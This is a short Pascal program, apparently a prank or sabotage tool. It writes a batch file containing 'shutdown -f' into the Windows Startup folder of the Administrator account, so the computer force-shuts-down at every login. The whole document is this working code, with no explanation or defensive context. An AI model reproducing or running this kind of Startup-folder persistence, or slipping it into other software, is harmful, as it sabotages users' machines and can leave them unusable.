program cs_shutdown_2017_2_1;
var i:integer;
begin
  assign(output,'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\0.cmd');
  rewrite(output);
  writeln('shutdown -f');
  close(output);
end.
